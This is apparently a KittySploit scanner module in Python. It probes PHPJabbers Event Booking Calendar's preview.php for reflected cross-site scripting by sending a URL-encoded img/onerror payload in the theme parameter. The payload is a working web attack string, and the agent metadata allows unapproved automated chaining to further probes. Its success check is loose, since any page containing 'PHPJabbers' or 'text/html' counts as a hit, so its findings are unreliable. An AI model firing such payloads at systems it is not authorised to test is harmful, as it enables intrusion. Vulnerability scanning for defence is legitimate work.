#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detected that PHPJabbers Event Booking Calendar contained a reflected cross-site scripting vulnerability in th."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHPJabbers Event Booking Calendar - Reflected XSS Detection',
        'description': 'Detected that PHPJabbers Event Booking Calendar contained a reflected cross-site scripting vulnerability in the preview.php endpoint',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'phpjabbers', 'xss', 'reflected'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cxsecurity.com/issue/WLB-2026050008',
            'https://www.phpjabbers.com/event-booking-calendar/',
        ],
    }

    def run(self):
        for path in ('/scripts/event-booking-calendar/preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3Etest', '/preview.php?locale=1&hide=0&theme=theme1%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3Etest'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('<img src=x onerror=alert(document.domain)>test', 'Event Booking Calendar', 'PHPJabbers', 'text/html',)
            if (any(m in body for m in body_any)):
                self.set_info(
                    severity='medium',
                    reason="PHPJabbers Event Booking Calendar - Reflected XSS detected",
                    path=path,
                )
                return True
        return False

